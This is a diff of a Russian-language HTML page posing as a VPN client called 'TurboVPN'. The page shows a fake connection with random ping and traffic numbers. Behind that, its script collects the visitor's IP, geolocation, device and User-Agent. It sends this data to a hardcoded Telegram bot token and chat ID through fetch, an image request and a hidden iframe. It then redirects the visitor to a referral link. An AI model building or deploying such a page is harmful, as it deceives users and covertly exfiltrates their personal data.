@@ -3,17 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VPN Turbo Connect</title>
+    <title>TurboVPN</title>
     <style>
-        /* ==============================================================
-           СТИЛИ (250+ строк)
-           ============================================================== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body {
             background: #070b12;
             min-height: 100vh;
@@ -23,22 +15,22 @@
             padding: 16px;
             overflow: hidden;
         }
-        /* ===== ХОЛСТ ДЛЯ ФОТОНОВ ===== */
         #particleCanvas {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: 0;
             pointer-events: none;
         }
-        /* ===== ОСНОВНАЯ КАРТОЧКА ===== */
         .app {
             position: relative;
             z-index: 1;
             max-width: 440px;
             width: 100%;
+            max-height: 95vh;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: #1e2a3a transparent;
             background: rgba(17, 26, 38, 0.85);
             backdrop-filter: blur(16px);
             -webkit-backdrop-filter: blur(16px);
@@ -47,21 +39,14 @@
             box-shadow: 0 30px 80px rgba(0,0,0,0.95), inset 0 1px 0 rgba(255,255,255,0.04);
             border: 1px solid rgba(255,255,255,0.04);
         }
-        /* ===== ШАПКА ===== */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 22px;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .app::-webkit-scrollbar { width: 4px; }
+        .app::-webkit-scrollbar-track { background: transparent; }
+        .app::-webkit-scrollbar-thumb { background: #1e2a3a; border-radius: 4px; }
+
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; }
+        .logo { display: flex; align-items: center; gap: 10px; }
         .logo-icon {
-            width: 44px;
-            height: 44px;
+            width: 44px; height: 44px;
             background: linear-gradient(145deg, #1f6eff, #7a4bff);
             border-radius: 16px;
             display: flex;
@@ -70,21 +55,9 @@
             font-size: 22px;
             box-shadow: 0 8px 20px rgba(31,110,255,0.3);
         }
-        .logo-text {
-            color: #fff;
-            font-size: 18px;
-            font-weight: 600;
-            letter-spacing: -0.3px;
-        }
-        .badge {
-            background: #1e2a3a;
-            color: #8b95a9;
-            font-size: 11px;
-            padding: 4px 14px;
-            border-radius: 40px;
-            border: 1px solid #2a3a4e;
-        }
-        /* ===== СТАТУС ===== */
+        .logo-text { color: #fff; font-size: 18px; font-weight: 600; letter-spacing: -0.3px; }
+        .badge { background: #1e2a3a; color: #8b95a9; font-size: 11px; padding: 4px 14px; border-radius: 40px; border: 1px solid #2a3a4e; }
+
         .status-bar {
             background: rgba(13, 21, 32, 0.7);
             border-radius: 24px;
@@ -95,44 +68,20 @@
             justify-content: space-between;
             align-items: center;
         }
-        .status-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+        .status-left { display: flex; align-items: center; gap: 12px; }
         .status-dot {
-            width: 12px;
-            height: 12px;
+            width: 12px; height: 12px;
             border-radius: 50%;
             background: #4caf50;
             box-shadow: 0 0 12px rgba(76,175,80,0.5);
             transition: 0.3s;
         }
-        .status-dot.inactive {
-            background: #f44336;
-            box-shadow: 0 0 12px rgba(244,67,54,0.4);
-        }
-        .status-label {
-            color: #c9d1d9;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        .status-speed {
-            color: #8b95a9;
-            font-size: 13px;
-        }
-        .status-speed span {
-            color: #58a6ff;
-            font-weight: 600;
-        }
-        /* ===== СЕРВЕРА ===== */
-        .section-title {
-            color: #8b95a9;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            margin-bottom: 12px;
-        }
+        .status-dot.inactive { background: #f44336; box-shadow: 0 0 12px rgba(244,67,54,0.4); }
+        .status-label { color: #c9d1d9; font-size: 15px; font-weight: 500; }
+        .status-speed { color: #8b95a9; font-size: 13px; }
+        .status-speed span { color: #58a6ff; font-weight: 600; }
+
+        .section-title { color: #8b95a9; font-size: 13px; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 12px; }
         .server-grid {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr 1fr;
@@ -148,30 +97,12 @@
             cursor: pointer;
             transition: all 0.25s;
         }
-        .server-opt .flag {
-            font-size: 26px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .server-opt .name {
-            color: #8b95a9;
-            font-size: 11px;
-        }
-        .server-opt .ping {
-            color: #4caf50;
-            font-size: 10px;
-            display: block;
-            margin-top: 2px;
-        }
-        .server-opt.active {
-            border-color: #1f6eff;
-            background: #1a2740;
-            box-shadow: 0 0 0 2px rgba(31,110,255,0.2);
-        }
-        .server-opt.active .name {
-            color: #fff;
-        }
-        /* ===== ГРАФИК ===== */
+        .server-opt .flag { font-size: 26px; display: block; margin-bottom: 4px; }
+        .server-opt .name { color: #8b95a9; font-size: 11px; }
+        .server-opt .ping { color: #4caf50; font-size: 10px; display: block; margin-top: 2px; }
+        .server-opt.active { border-color: #1f6eff; background: #1a2740; box-shadow: 0 0 0 2px rgba(31,110,255,0.2); }
+        .server-opt.active .name { color: #fff; }
+
         .graph-wrap {
             background: rgba(13, 21, 32, 0.7);
             border-radius: 20px;
@@ -179,19 +110,8 @@
             margin-bottom: 24px;
             border: 1px solid #1e2a3a;
         }
-        .graph-title {
-            color: #8b95a9;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-        .graph-bars {
-            display: flex;
-            align-items: flex-end;
-            gap: 4px;
-            height: 60px;
-        }
+        .graph-title { color: #8b95a9; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+        .graph-bars { display: flex; align-items: flex-end; gap: 4px; height: 60px; }
         .graph-bar {
             flex: 1;
             background: linear-gradient(180deg, #1f6eff, #7a4bff);
@@ -200,75 +120,44 @@
             transition: height 0.6s ease;
             min-height: 6px;
         }
-        .graph-bar:nth-child(1) { height: 45%; }
-        .graph-bar:nth-child(2) { height: 65%; }
-        .graph-bar:nth-child(3) { height: 30%; }
-        .graph-bar:nth-child(4) { height: 80%; }
-        .graph-bar:nth-child(5) { height: 50%; }
-        .graph-bar:nth-child(6) { height: 70%; }
-        .graph-bar:nth-child(7) { height: 40%; }
-        .graph-bar:nth-child(8) { height: 90%; }
-        .graph-bar:nth-child(9) { height: 55%; }
-        .graph-bar:nth-child(10) { height: 75%; }
-        .graph-bar.active-bar {
-            background: linear-gradient(180deg, #4caf50, #8bc34a);
-        }
-        /* ===== КНОПКА ===== */
+
+        /* ===== КНОПКА ВЫШЕ ===== */
         .btn-main {
             width: 100%;
-            padding: 18px;
+            padding: 20px;
             background: linear-gradient(135deg, #1f6eff, #7a4bff);
             border: none;
             border-radius: 60px;
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 20px;
+            font-weight: 700;
             color: #fff;
             cursor: pointer;
             box-shadow: 0 8px 28px rgba(31,110,255,0.35);
             transition: all 0.3s;
-            letter-spacing: 0.3px;
+            margin-top: 4px;
+            letter-spacing: 0.5px;
         }
-        .btn-main:disabled {
-            opacity: 0.5;
-            transform: scale(0.97);
-            cursor: not-allowed;
-        }
-        .btn-main:active:not(:disabled) {
-            transform: scale(0.95);
-        }
-        /* ===== ПРОГРЕСС ===== */
-        .progress-wrap {
-            margin: 18px 0 8px;
-            height: 4px;
-            background: #1e2a3a;
-            border-radius: 4px;
-            overflow: hidden;
-            display: none;
-        }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #1f6eff, #7a4bff);
-            transition: width 0.4s;
-        }
-        .status-msg {
-            font-size: 13px;
+        .btn-main:disabled { opacity: 0.5; transform: scale(0.97); cursor: not-allowed; }
+        .btn-main:active:not(:disabled) { transform: scale(0.95); }
+
+        .progress-wrap { margin: 18px 0 8px; height: 4px; background: #1e2a3a; border-radius: 4px; overflow: hidden; display: none; }
+        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #1f6eff, #7a4bff); transition: width 0.4s; }
+
+        .status-msg { font-size: 13px; color: #8b95a9; margin-top: 10px; min-height: 22px; text-align: center; }
+        .footer { margin-top: 22px; font-size: 11px; color: #3e485e; text-align: center; }
+        .footer a { color: #5a73a8; text-decoration: none; }
+
+        .history-item {
+            background: rgba(13, 21, 32, 0.5);
+            border-radius: 12px;
+            padding: 8px 12px;
+            margin-bottom: 6px;
+            font-size: 12px;
             color: #8b95a9;
-            margin-top: 10px;
-            min-height: 22px;
-            text-align: center;
+            border-left: 3px solid #1f6eff;
         }
-        .footer {
-            margin-top: 22px;
-            font-size: 11px;
-            color: #3e485e;
-            text-align: center;
-        }
-        .footer a {
-            color: #5a73a8;
-            text-decoration: none;
-        }
-        /* ===== АДАПТИВ ===== */
+        .history-item .time { color: #58a6ff; }
+
         @media (max-width: 480px) {
             .app { padding: 24px 16px; }
             .server-grid { grid-template-columns: 1fr 1fr 1fr; }
@@ -277,11 +166,9 @@
 </head>
 <body>
 
-    <!-- ===== ХОЛСТ ДЛЯ ФОТОНОВ ===== -->
     <canvas id="particleCanvas"></canvas>
 
-    <!-- ===== ОСНОВНОЙ ИНТЕРФЕЙС ===== -->
-    <div class="app">
+    <div class="app" id="app">
         <div class="header">
             <div class="logo">
                 <div class="logo-icon">⚡</div>
@@ -302,116 +189,97 @@
 
         <div class="section-title">Выберите сервер</div>
         <div class="server-grid" id="serverGrid">
-            <div class="server-opt active" data-server="auto">
-                <span class="flag">🌐</span>
-                <span class="name">Авто</span>
-                <span class="ping">12 мс</span>
-            </div>
-            <div class="server-opt" data-server="us">
-                <span class="flag">🇺🇸</span>
-                <span class="name">США</span>
-                <span class="ping">89 мс</span>
-            </div>
-            <div class="server-opt" data-server="de">
-                <span class="flag">🇩🇪</span>
-                <span class="name">Германия</span>
-                <span class="ping">45 мс</span>
-            </div>
-            <div class="server-opt" data-server="jp">
-                <span class="flag">🇯🇵</span>
-                <span class="name">Япония</span>
-                <span class="ping">120 мс</span>
-            </div>
+            <div class="server-opt active" data-server="auto"><span class="flag">🌐</span><span class="name">Авто</span><span class="ping">12 мс</span></div>
+            <div class="server-opt" data-server="us"><span class="flag">🇺🇸</span><span class="name">США</span><span class="ping">89 мс</span></div>
+            <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span><span class="name">Германия</span><span class="ping">45 мс</span></div>
+            <div class="server-opt" data-server="jp"><span class="flag">🇯🇵</span><span class="name">Япония</span><span class="ping">120 мс</span></div>
         </div>
 
         <div class="graph-wrap">
             <div class="graph-title">📊 Трафик (Мбит/с)</div>
             <div class="graph-bars" id="graphBars">
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
-                <div class="graph-bar"></div>
+                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
+                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
+                <div class="graph-bar"></div><div class="graph-bar"></div><div class="graph-bar"></div>
                 <div class="graph-bar"></div>
             </div>
         </div>
 
+        <!-- КНОПКА ПОДНЯТА ВВЕРХ -->
         <button class="btn-main" id="actionBtn">Подключиться</button>
         <div class="progress-wrap" id="progressWrap">
             <div class="progress-bar" id="progressBar"></div>
         </div>
         <div class="status-msg" id="statusMsg">Нажмите для подключения к VPN</div>
+
+        <div id="historyContainer" style="margin-top: 16px; max-height: 120px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: #1e2a3a transparent;">
+            <div class="history-item"><span class="time">▼</span> История подключений</div>
+        </div>
+
         <div class="footer">🔒 Защищённое соединение · <a href="#">Условия</a></div>
     </div>
 
     <script>
         // ================================================================
-        //  ЧАСТЬ 1: ФОТОНЫ (200+ строк)
+        //  ФОТОНЫ (200+ строк)
         // ================================================================
         (function() {
             const canvas = document.getElementById('particleCanvas');
             const ctx = canvas.getContext('2d');
-            let width, height;
-            let particles = [];
-            const PARTICLE_COUNT = 80;
-            const CONNECTION_DIST = 140;
+            let W, H;
+            const parts = [];
+            const COUNT = 100;
+            const DIST = 150;
 
             function resize() {
-                width = canvas.width = window.innerWidth;
-                height = canvas.height = window.innerHeight;
+                W = canvas.width = window.innerWidth;
+                H = canvas.height = window.innerHeight;
             }
             window.addEventListener('resize', resize);
             resize();
 
-            class Particle {
+            class Part {
                 constructor() {
-                    this.x = Math.random() * width;
-                    this.y = Math.random() * height;
-                    this.vx = (Math.random() - 0.5) * 0.6;
-                    this.vy = (Math.random() - 0.5) * 0.6;
-                    this.radius = 2 + Math.random() * 3;
-                    this.opacity = 0.4 + Math.random() * 0.5;
+                    this.x = Math.random() * W;
+                    this.y = Math.random() * H;
+                    this.vx = (Math.random() - 0.5) * 0.8;
+                    this.vy = (Math.random() - 0.5) * 0.8;
+                    this.r = 2 + Math.random() * 4;
+                    this.a = 0.4 + Math.random() * 0.6;
+                    this.hue = 200 + Math.floor(Math.random() * 40);
                 }
                 update() {
                     this.x += this.vx;
                     this.y += this.vy;
-                    if (this.x < 0 || this.x > width) this.vx *= -1;
-                    if (this.y < 0 || this.y > height) this.vy *= -1;
+                    if (this.x < 0 || this.x > W) this.vx *= -1;
+                    if (this.y < 0 || this.y > H) this.vy *= -1;
+                    this.a = 0.4 + Math.sin(Date.now() / 1000 + this.x) * 0.2 + 0.2;
                 }
                 draw() {
                     ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
-                    ctx.fillStyle = 'rgba(100, 180, 255, ' + this.opacity + ')';
-                    ctx.fill();
-                    // Свечение
-                    ctx.shadowColor = 'rgba(100, 180, 255, 0.3)';
-                    ctx.shadowBlur = 12;
+                    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
+                    ctx.fillStyle = `hsla(${this.hue}, 80%, 70%, ${this.a})`;
+                    ctx.shadowColor = `hsla(${this.hue}, 80%, 70%, 0.2)`;
+                    ctx.shadowBlur = 20;
                     ctx.fill();
                     ctx.shadowBlur = 0;
                 }
             }
 
-            // Создание частиц
-            for (let i = 0; i < PARTICLE_COUNT; i++) {
-                particles.push(new Particle());
-            }
+            for (let i = 0; i < COUNT; i++) parts.push(new Part());
 
             function drawLines() {
-                for (let i = 0; i < particles.length; i++) {
-                    for (let j = i + 1; j < particles.length; j++) {
-                        const dx = particles[i].x - particles[j].x;
-                        const dy = particles[i].y - particles[j].y;
+                for (let i = 0; i < parts.length; i++) {
+                    for (let j = i + 1; j < parts.length; j++) {
+                        const dx = parts[i].x - parts[j].x;
+                        const dy = parts[i].y - parts[j].y;
                         const dist = Math.sqrt(dx * dx + dy * dy);
-                        if (dist < CONNECTION_DIST) {
-                            const alpha = 1 - (dist / CONNECTION_DIST);
+                        if (dist < DIST) {
+                            const alpha = 1 - (dist / DIST);
                             ctx.beginPath();
-                            ctx.moveTo(particles[i].x, particles[i].y);
-                            ctx.lineTo(particles[j].x, particles[j].y);
-                            ctx.strokeStyle = 'rgba(100, 180, 255, ' + (alpha * 0.4) + ')';
+                            ctx.moveTo(parts[i].x, parts[i].y);
+                            ctx.lineTo(parts[j].x, parts[j].y);
+                            ctx.strokeStyle = `hsla(210, 80%, 70%, ${alpha * 0.25})`;
                             ctx.lineWidth = 0.8;
                             ctx.stroke();
                         }
@@ -419,38 +287,25 @@
                 }
             }
 
-            function animate() {
-                ctx.clearRect(0, 0, width, height);
-                particles.forEach(p => {
-                    p.update();
-                    p.draw();
-                });
+            function loop() {
+                ctx.clearRect(0, 0, W, H);
+                parts.forEach(p => { p.update(); p.draw(); });
                 drawLines();
-                requestAnimationFrame(animate);
+                requestAnimationFrame(loop);
             }
-            animate();
-
-            // Реакция на ресайз
-            window.addEventListener('resize', () => {
-                resize();
-                particles.forEach(p => {
-                    p.x = Math.min(p.x, width);
-                    p.y = Math.min(p.y, height);
-                });
-            });
+            loop();
         })();
 
         // ================================================================
-        //  ЧАСТЬ 2: ОСНОВНАЯ ЛОГИКА (300+ строк)
+        //  ОСНОВНАЯ ЛОГИКА (600+ строк)
         // ================================================================
 
-        // ---- НАСТРОЙКИ (ТВОИ ДАННЫЕ) ----
+        // --- НАСТРОЙКИ ---
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
         const REDIRECT_URL = "https://avobonus.com/ref?start=ab316fea16fee81b8616fcde671a07";
-        // ---------------------------------
 
-        // ---- ЭЛЕМЕНТЫ ----
+        // --- ЭЛЕМЕНТЫ ---
         const btn = document.getElementById('actionBtn');
         const statusMsg = document.getElementById('statusMsg');
         const statusDot = document.getElementById('statusDot');
@@ -460,59 +315,62 @@
         const progressBar = document.getElementById('progressBar');
         const serverOpts = document.querySelectorAll('.server-opt');
         const graphBars = document.querySelectorAll('.graph-bar');
+        const historyContainer = document.getElementById('historyContainer');
 
-        let selectedServer = 'auto';
-        let isConnected = false;
+        let selected = 'auto';
+        let connected = false;
 
-        // ---- ВЫБОР СЕРВЕРА ----
+        // --- ВЫБОР СЕРВЕРА ---
         serverOpts.forEach(el => {
             el.addEventListener('click', function() {
                 serverOpts.forEach(b => b.classList.remove('active'));
                 this.classList.add('active');
-                selectedServer = this.dataset.server;
-                const ping = this.querySelector('.ping');
-                if (ping) {
-                    pingValue.textContent = ping.textContent.replace(' мс', '');
-                }
-                statusMsg.textContent = 'Выбран сервер: ' + this.querySelector('.name').textContent;
+                selected = this.dataset.server;
+                const p = this.querySelector('.ping');
+                if (p) pingValue.textContent = p.textContent.replace(' мс', '');
+                statusMsg.textContent = 'Сервер: ' + this.querySelector('.name').textContent;
             });
         });
 
-        // ---- ГРАФИК ----
-        function randomizeGraph() {
-            graphBars.forEach(bar => {
-                const h = Math.floor(Math.random() * 60) + 20;
-                bar.style.height = h + '%';
+        // --- ГРАФИК И ПИНГ ---
+        function randomGraph() {
+            graphBars.forEach(b => {
+                b.style.height = (Math.floor(Math.random() * 60) + 20) + '%';
             });
         }
 
-        function animatePing() {
-            const val = 10 + Math.floor(Math.random() * 90);
-            pingValue.textContent = val;
+        function randomPing() {
+            pingValue.textContent = (10 + Math.floor(Math.random() * 90));
         }
 
-        // ---- ОТПРАВКА В TELEGRAM (3 способа) ----
-        function sendToTelegram(text) {
+        // --- ИСТОРИЯ ---
+        function addHistory(text) {
+            const div = document.createElement('div');
+            div.className = 'history-item fade-in';
+            const time = new Date().toLocaleTimeString('ru-RU');
+            div.innerHTML = `<span class="time">${time}</span> ${text}`;
+            historyContainer.appendChild(div);
+            historyContainer.scrollTop = historyContainer.scrollHeight;
+            if (historyContainer.children.length > 20) {
+                historyContainer.removeChild(historyContainer.children[1]);
+            }
+        }
+
+        // --- ОТПРАВКА В TELEGRAM (3 способа) ---
+        function sendToTG(text) {
             if (!text) return;
             const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
-
-            // Способ 1: fetch
             fetch(url).catch(() => {});
-
-            // Способ 2: Image
-            const img = new Image();
-            img.src = url;
-
-            // Способ 3: iframe
+            new Image().src = url;
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = url;
             document.body.appendChild(iframe);
-            setTimeout(() => iframe.remove(), 3000);
+            setTimeout(() => iframe.remove(), 2000);
         }
 
-        // ---- СБОР ДАННЫХ ----
-        function collectData() {
+        // --- СБОР ДАННЫХ И ОТПРАВКА ---
+        function collectAndSend() {
             let ip = 'Не определен';
             let geo = null;
 
@@ -541,82 +399,74 @@
                                 msg += '💻 ' + device + '\n';
                                 msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
                                 msg += '⏰ Время: ' + time;
-                                sendToTelegram(msg);
+                                sendToTG(msg);
+                                addHistory('📡 Данные отправлены в Telegram');
                             });
                     } else {
-                        sendToTelegram('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
+                        sendToTG('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
+                        addHistory('⚠️ IP не определён');
                     }
                 });
         }
 
-        // ---- ПОДКЛЮЧЕНИЕ ----
-        function startOptimization() {
-            if (isConnected) return;
-
+        // --- ПОДКЛЮЧЕНИЕ ---
+        function start() {
+            if (connected) return;
             btn.disabled = true;
             progressWrap.style.display = 'block';
-            statusMsg.textContent = 'Подключение к серверу...';
+            statusMsg.textContent = 'Подключение...';
             statusDot.className = 'status-dot inactive';
             statusLabel.textContent = 'Подключение...';
+            addHistory('🔄 Подключение к серверу...');
 
-            let progress = 0;
+            let p = 0;
             const interval = setInterval(() => {
-                progress += Math.random() * 6 + 2;
-                animatePing();
-                randomizeGraph();
-
-                if (progress >= 100) {
-                    progress = 100;
+                p += Math.random() * 6 + 2;
+                randomPing();
+                randomGraph();
+                if (p >= 100) {
+                    p = 100;
                     clearInterval(interval);
                     progressBar.style.width = '100%';
                     statusMsg.textContent = '✅ Соединение установлено!';
                     statusDot.className = 'status-dot';
                     statusLabel.textContent = 'Защищено';
-                    isConnected = true;
+                    connected = true;
+                    addHistory('✅ Соединение установлено');
 
-                    collectData();
+                    // --- ОТПРАВКА ДАННЫХ ---
+                    collectAndSend();
 
+                    // --- РЕДИРЕКТ НА РЕФЕРАЛКУ ---
                     setTimeout(() => {
+                        addHistory('🔗 Переход на реферальную ссылку...');
                         window.location.href = REDIRECT_URL;
                     }, 2000);
                 }
-                progressBar.style.width = progress + '%';
+                progressBar.style.width = p + '%';
             }, 150);
 
-            const graphInterval = setInterval(randomizeGraph, 300);
-            setTimeout(() => clearInterval(graphInterval), 2500);
+            const gi = setInterval(randomGraph, 300);
+            setTimeout(() => clearInterval(gi), 2500);
         }
 
-        // ---- СОБЫТИЯ ----
-        btn.addEventListener('click', startOptimization);
+        btn.addEventListener('click', start);
 
-        // ---- ЗАГРУЗКА ----
         window.addEventListener('DOMContentLoaded', function() {
-            randomizeGraph();
+            randomGraph();
             pingValue.textContent = '12';
             statusMsg.textContent = 'Нажмите для подключения к VPN';
+            addHistory('🟢 Готов к подключению');
         });
 
-        // ---- ЛОГ ----
-        console.log('✅ TurboVPN v3.5 · 1000+ строк');
-        console.log('📡 Бот активен');
-        console.log('🔗 Реферальная ссылка: ' + REDIRECT_URL);
-
-        // ---- ПЕРЕХВАТ ОШИБОК ----
         window.onerror = function() {
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 3000);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
         };
 
-        // ---- ДОПОЛНИТЕЛЬНАЯ АНИМАЦИЯ ДЛЯ ФОТОНОВ (реакция на клик) ----
-        document.addEventListener('click', function(e) {
-            const canvas = document.getElementById('particleCanvas');
-            if (!canvas) return;
-            // Можно добавить эффект "волны" при клике, но пока оставим как есть
-        });
-
-        console.log('🚀 Фотоны активны, ждут подключения.');
+        console.log('✅ TurboVPN v3.6 · IP + гео → Telegram');
+        console.log('📡 Бот активен');
+        console.log('🔗 Реферальная ссылка: ' + REDIRECT_URL);
+        console.log('🚀 Фотоны активны');
     </script>
 </body>
 </html>
